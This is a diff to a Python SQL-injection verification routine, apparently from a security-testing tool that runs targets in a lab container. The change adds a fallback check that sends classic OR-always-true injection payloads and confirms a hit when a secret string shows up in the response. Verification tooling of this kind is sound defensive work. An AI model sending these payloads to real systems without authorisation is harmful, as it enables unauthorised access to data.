@@ -2453,6 +2453,9 @@ def verify_generic_sqli_blind(
     sqli_identifier_table_hint: str = "",
     custom_headers: Optional[dict] = None,
     setup_commands: Optional[List[str]] = None,
+    dockerfile_body: str = "",
+    extra_files: Optional[dict] = None,
+    confirm_string: str = "",
 ) -> WpVerifyResult:
     """SQL injection ciega por TIEMPO contra cualquier objetivo con su propio Dockerfile/compose.
     Deliberadamente mas limitada que verify_wordpress_sqli: sin saber el motor real de BD (puede
@@ -2498,7 +2501,9 @@ def verify_generic_sqli_blind(
         return res
 
     boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
-                                   setup_commands=setup_commands)
+                                   setup_commands=setup_commands,
+                                   dockerfile_body=dockerfile_body,
+                                   extra_files=extra_files)
     if boot is None:
         return res
     lab, base_url, container = boot
@@ -2795,6 +2800,43 @@ def verify_generic_sqli_blind(
                          f"{_size_diff} bytes confirma inyeccion SQLi.")
                     break
 
+        # Fallback: si confirm_string está configurado, compara la baseline (sin inyección)
+        # con el payload OR-always-TRUE. Si el string secreto NO está en la baseline pero SÍ
+        # aparece tras la inyección, hay SQLi in-band aunque el diferencial de tamaño sea 0
+        # (p.ej. SQLite donde OR '1'='2' también fuerza 2 filas por razones de quoting).
+        if not found and confirm_string:
+            try:
+                _resp_base = _http_request(m, base_url + endpoint_path, timeout=15,
+                                           params=base_params if m == "GET" else None,
+                                           data=base_params if m != "GET" else None)
+                _base_body = getattr(_resp_base, "text", "") or ""
+                if confirm_string not in _base_body:
+                    for _cs_pl in (f"{orig_value}' OR '1'='1",
+                                   f"{orig_value}' OR 1=1-- -",
+                                   f"{orig_value} OR 1=1-- -"):
+                        _inj_d = dict(base_params); _inj_d[sqli_param] = _cs_pl
+                        _resp_inj = _http_request(m, base_url + endpoint_path, timeout=15,
+                                                  params=_inj_d if m == "GET" else None,
+                                                  data=_inj_d if m != "GET" else None)
+                        _inj_body = getattr(_resp_inj, "text", "") or ""
+                        if (getattr(_resp_inj, "status_code", 0) in range(200, 300)
+                                and confirm_string in _inj_body):
+                            found = True
+                            res.evidence["payload_ganador"]          = _cs_pl
+                            res.evidence["estrategia"]               = "boolean-inband-confirm"
+                            res.evidence["confirm_string"]           = confirm_string
+                            res.evidence["respuesta_cuerpo_recorte"] = _inj_body[:500]
+                            res.evidence["baseline_len"]             = len(_base_body)
+                            res.evidence["inyeccion_len"]            = len(_inj_body)
+                            step(f"VERIFICADO (boolean in-band confirm): "
+                                 f"'{sqli_param}={_cs_pl!r}' devolvio '{confirm_string}' "
+                                 f"en el cuerpo ({len(_inj_body)} bytes) pero la baseline "
+                                 f"({len(_base_body)} bytes) NO lo contenia -- SQLi in-band "
+                                 f"confirmada por exfiltracion de datos.")
+                            break
+            except Exception:
+                pass
+
         res.evidence["intentos"] = tried
         if found:
             res.verified = True
@@ -2813,6 +2855,13 @@ def verify_generic_sqli_blind(
                               f"{res.evidence['respuesta_false_len']} bytes -- diferencia de "
                               f"{res.evidence['respuesta_true_len'] - res.evidence['respuesta_false_len']} bytes "
                               f"confirma que la entrada llega al motor SQL sin sanitizar")
+            elif estrategia == "boolean-inband-confirm":
+                res.detail = (f"SQLI IN-BAND confirmada por exfiltracion: "
+                              f"'{sqli_param}={res.evidence['payload_ganador']!r}' "
+                              f"devolvio '{res.evidence['confirm_string']}' en el cuerpo "
+                              f"({res.evidence['inyeccion_len']} bytes) mientras que la baseline "
+                              f"sin inyeccion ({res.evidence['baseline_len']} bytes) no lo contenia "
+                              f"-- la entrada llega sin sanitizar al motor SQL")
             else:
                 res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
                               f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
